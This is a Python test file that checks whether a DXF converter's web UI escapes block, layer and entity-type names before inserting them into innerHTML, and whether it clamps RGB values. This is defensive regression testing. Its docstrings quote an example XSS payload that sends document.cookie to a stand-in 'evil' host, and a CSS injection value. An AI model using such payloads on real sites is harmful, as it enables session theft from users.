"""
tests/test_ui_security.py
─────────────────────────
DX-SEC-005: ui/index.html must escape DXF block / layer / entity-type strings
before interpolating them into innerHTML.

The vector: a DXF with a block name like
    <img src=x onerror="fetch('//evil/'+document.cookie)">
flows through extractor._audit → converter.audit() → /api/convert JSON →
renderAudit() / renderLayers() in the browser. If those functions interpolate
the name verbatim into innerHTML the payload runs in the user's browser.

The fix is the esc() helper added at the top of the script block, applied to
every attacker-controllable string before interpolation. These tests assert the
helper exists and the two render paths use it. They are static-source assertions
because the project has no JS test runner.
"""

import os
import re
import sys
from pathlib import Path

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

REPO_ROOT = Path(__file__).resolve().parent.parent
INDEX_HTML = REPO_ROOT / "ui" / "index.html"


@pytest.fixture(scope="module")
def html_text() -> str:
    return INDEX_HTML.read_text(encoding="utf-8")


def _slice_function(text: str, name: str) -> str:
    """Return the body of a top-level `function name(...) { ... }` block."""
    m = re.search(rf"function\s+{re.escape(name)}\s*\([^)]*\)\s*\{{", text)
    assert m, f"function {name} not found in {INDEX_HTML.name}"
    depth = 1
    i = m.end()
    while depth and i < len(text):
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
        i += 1
    return text[m.start():i]


# ── DX-SEC-005: helper presence and call sites ────────────────────────────────


def test_esc_helper_is_defined(html_text: str):
    """An esc() helper must exist that escapes &, <, >, \", ' (DX-SEC-005)."""
    # Locate a definition like: const esc = s => ... .replace(/[&<>"']/g, ...)
    assert re.search(
        r"const\s+esc\s*=.*?\.replace\(\s*/\[&<>\"']/g",
        html_text,
        re.DOTALL,
    ), (
        "esc() helper is missing from ui/index.html — DX-SEC-005 regression. "
        "Add the helper that escapes &, <, >, \", ' before innerHTML interpolation."
    )


def test_render_audit_escapes_block_and_entity_names(html_text: str):
    """renderAudit must call esc() on bname and etype (DX-SEC-005)."""
    body = _slice_function(html_text, "renderAudit")
    assert "esc(bname)" in body, (
        "renderAudit interpolates DXF block names into innerHTML without esc() — "
        "DX-SEC-005 regression."
    )
    assert "esc(etype)" in body, (
        "renderAudit interpolates DXF entity-type strings into innerHTML without esc()."
    )


def test_render_layers_escapes_layer_name_and_linetype(html_text: str):
    """renderLayers must call esc() on layer name and linetype (DX-SEC-005)."""
    body = _slice_function(html_text, "renderLayers")
    assert "esc(name)" in body, (
        "renderLayers interpolates DXF layer names into innerHTML without esc() — "
        "DX-SEC-005 regression."
    )
    assert re.search(r"esc\(\s*info\.linetype", body), (
        "renderLayers interpolates info.linetype into innerHTML without esc()."
    )


def test_render_layers_clamps_rgb_to_integers(html_text: str):
    """renderLayers must coerce info.rgb members to integers before CSS interpolation.

    Without coercion, an attacker-controlled rgb like ['1);font-family:url(','','']
    would break out of the rgb(...) syntax. The fix maps rgb to (n | 0).
    """
    body = _slice_function(html_text, "renderLayers")
    assert re.search(r"info\.rgb\.map\(\s*n\s*=>\s*n\s*\|\s*0", body), (
        "renderLayers does not clamp info.rgb members to integers — DX-SEC-005 partial regression."
    )
